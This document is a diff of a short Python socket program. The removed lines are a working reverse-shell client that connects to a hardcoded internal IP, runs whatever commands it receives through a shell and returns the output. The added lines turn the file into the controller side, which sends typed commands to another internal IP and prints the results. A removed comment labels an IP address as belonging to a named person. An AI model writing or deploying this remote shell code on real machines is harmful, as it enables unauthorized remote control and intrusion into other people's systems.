@@ -1,27 +1,22 @@
 import socket
-import os
-import subprocess
 
 # create a socket
 s = socket.socket()
-# brandon's ip: 10.250.0.1
-host = '10.250.64.198'
+
+# Get the server computer's IP address
+server_ip_address = '10.250.253.162'
 port = 9998
 
-s.connect((host, port))
+s.connect((server_ip_address, port))
 
 while True:
-    data = s.recv(1024)
+    cmd = input()
 
-    # make sure there isn't cd
-    if data[:2].decode("utf-8") == 'cd':
-        os.chdir(data[3:].decode("utf-8"))
+    if len(str.encode(cmd)) > 0:
+        s.send(str.encode(cmd))
+        client_response = str(s.recv(1024),"utf-8")
+        print(client_response, end="")
 
-    if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        output_byte = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_byte,"utf-8")
-        currentWD = os.getcwd() + "> "
-        s.send(str.encode(output_str + currentWD))
-
-        print(output_str)
+    if cmd == "quit":
+        s.send(str.encode(cmd))
+        break
